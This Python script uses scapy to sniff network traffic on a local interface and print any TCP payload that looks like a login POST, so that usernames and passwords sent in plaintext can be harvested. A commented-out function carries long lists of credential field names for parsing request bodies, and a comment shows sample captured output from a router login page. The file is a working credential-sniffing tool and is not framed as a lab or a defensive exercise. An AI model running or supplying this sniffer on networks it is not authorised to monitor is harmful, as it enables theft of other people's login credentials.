from scapy.all import *
from urllib import parse
import re


iface = 'eth0'

# def get_login_pass(body):
#     user = None
#     passwd = None

#     userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
#                   'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
#                   'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
#                   'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
#                   'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
#     passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
#                   'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
#                   'login_password'
#                   'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

#     for login in userfields:
#         login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
#         if login_re:
#             user = login_re.group()
#     for passfield in passfields:
#         pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
#         if pass_re:
#             passwd = pass_re.group()

#     if user and passwd:
#         return user, passwd


def pkt_parser(packet):
    # if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
    #     body = str(packet[TCP].payload)
    #     user_pass = get_login_pass(body)
    #     if user_pass != None:
    #         print(packet[TCP].payload)
    #         print(parse.unquote(user_pass[0]))
    #         print(parse.unquote(user_pass[1]))
    # else:
    #       pass

    if packet.haslayer(TCP):
        mypacket = str(packet[TCP].payload)
        if ('user' in mypacket.lower() or 'pass' in mypacket.lower()) and 'post' in mypacket.lower():
            print(f'[*] Destination: {packet[IP].dst}')
            print(f'[*] {parse.unquote(bytes(packet[TCP].payload).decode())}')

# [*] Destination: 192.168.0.1
# [*] POST /1/Device/Users/Login HTTP/1.1
# Host: 192.168.0.1
# Connection: keep-alive
# Content-Length: 75
# Accept: */*
# X-Requested-With: XMLHttpRequest
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.24
# Content-Type: application/x-www-form-urlencoded; charset=UTF-8
# Origin: http://192.168.0.1
# Referer: http://192.168.0.1/webpages/login.html
# Accept-Encoding: gzip, deflate
# Accept-Language: zh-TW,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
# Cookie: LANG_COOKIE=en_CHT; modelname=CODA-5310; isEdit=0; isEdit1=0; isEdit2=0; isEdit3=0

# model={"username":"username",+"password":"password"}

try:
    sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print('Exiting')
    exit(0)
